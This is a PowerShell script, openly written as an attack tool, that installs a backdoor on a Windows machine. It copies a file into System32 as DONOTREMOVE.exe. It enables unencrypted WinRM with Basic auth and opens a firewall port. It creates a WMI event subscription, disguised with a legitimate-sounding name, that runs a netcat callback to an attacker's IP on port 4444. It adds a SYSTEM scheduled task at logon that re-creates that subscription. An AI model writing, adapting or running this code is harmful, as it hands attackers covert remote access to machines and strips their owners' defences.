function Seed-System {
    $lines = Get-Content "seed.txt"
    $seeduser = $false
    $seedpassword = $false
    $seedtargets = $false

    while (!($seeduser -and $seedpassword -and $seedtargets)) {
        foreach ($line in $lines) {
            if ($line -match "^Account:") {
                $seeduser = ($line -split ":")[1].Trim()
                Write-Host "Account: $seeduser"
            } elseif ($line -match "^Password:") {
                $seedpassword = ($line -split ":")[1].Trim()
                Write-Host "Password: ********"  
            } elseif ($line -match "^Target\(s\):") {
                $seedtargets = ($line -split ":")[1].Trim() -split ","
                Write-Host "Targets: $seedtargets"
            }
        }

        if (!($seeduser -and $seedpassword -and $seedtargets)) {
            Write-Host "Seed failed. Check the seed.txt formatting."
            return $false
        }
    }

    Write-Host "Seed Passed. Script is starting."
    return @{user=$seeduser; password=$seedpassword; targets=$seedtargets}
}

function Setup-WMIPersistence {
    param (
        [string]$attackerIP 
    )
    
    Write-Host "Setting up WMI-based fileless persistence..."
    $eventFilterQuery = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'
    $eventFilterCommand = "wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name='DCOMServerProcessLauncher', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='$eventFilterQuery'"
    Invoke-Expression $eventFilterCommand
    $consumerCommand = "wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name='DCOMServerProcessLauncher', ExecutablePath='C:\\Windows\\System32\\DONOTREMOVE.exe', CommandLineTemplate='C:\\Windows\\System32\\DONOTREMOVE.exe nc $attackerIP 4444'"
    Invoke-Expression $consumerCommand
    $filterToConsumerCommand = "wmic /NAMESPACE:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""DCOMServerProcessLauncher""', Consumer='CommandLineEventConsumer.Name=""DCOMServerProcessLauncher""'"
    Invoke-Expression $filterToConsumerCommand

    Write-Host "WMI-based persistence set up successfully."
}


function Setup-TaskSchedulerPersistence {
    param (
        [string]$attackerIP 
    )
    
    Write-Host "Setting up Task Scheduler-based persistence..."

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name='DCOMServerProcessLauncher', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''; wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name='DCOMServerProcessLauncher', ExecutablePath='C:\\Windows\\System32\\DONOTREMOVE.exe', CommandLineTemplate='C:\\Windows\\System32\\DONOTREMOVE.exe nc $attackerIP 4444'; wmic /NAMESPACE:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""DCOMServerProcessLauncher""', Consumer='CommandLineEventConsumer.Name=""DCOMServerProcessLauncher""'`""

    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet
    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
    Register-ScheduledTask -TaskName "DONOTREMOVE" -InputObject $task

    Write-Host "Task Scheduler-based persistence set up successfully."
}

function Enable-PSRemotingAndWinRM {
    Write-Host "Enabling PowerShell Remoting, WinRM, and Firewall rules..."
    Enable-PSRemoting -Force
    Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true
    Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
    New-WSManInstance -ResourceURI winrm/config/Listener -SelectorSet @{Address="*"; Transport="HTTP"} -ValueSet @{Port="5985"; Hostname="*"}
    netsh advfirewall firewall add rule name="Allow WinRM" dir=in action=allow protocol=TCP localport=5985

    Write-Host "PowerShell Remoting and WinRM enabled successfully."
}
function Setup-BackdoorExecutable {
    Write-Host "Setting up DONOTREMOVE.exe using the 'pushsys' folder..."

    $pushsysFolder = "$(Get-Location)\pushsys"
    
    if (-not (Test-Path $pushsysFolder)) {
        Write-Host "The 'pushsys' folder does not exist in the current directory."
        return
    }
    Copy-Item -Path $pushsysFolder -Destination "C:\Windows\System32\DONOTREMOVE.exe" -Recurse -Force

    Write-Host "'pushsys' folder has been copied as DONOTREMOVE.exe to C:\Windows\System32."
}

Write-Host "Starting persistence setup..."

$attackerIP = Read-Host "Enter your attacker's IP (attacker machine IP)"
$seedData = Seed-System

if ($seedData) {
    $targetIP = $seedData.targets[0]

    Setup-BackdoorExecutable
    Enable-PSRemotingAndWinRM
    Setup-WMIPersistence -attackerIP $attackerIP
    Setup-TaskSchedulerPersistence -attackerIP $attackerIP
}

Write-Host "Persistence setup complete."
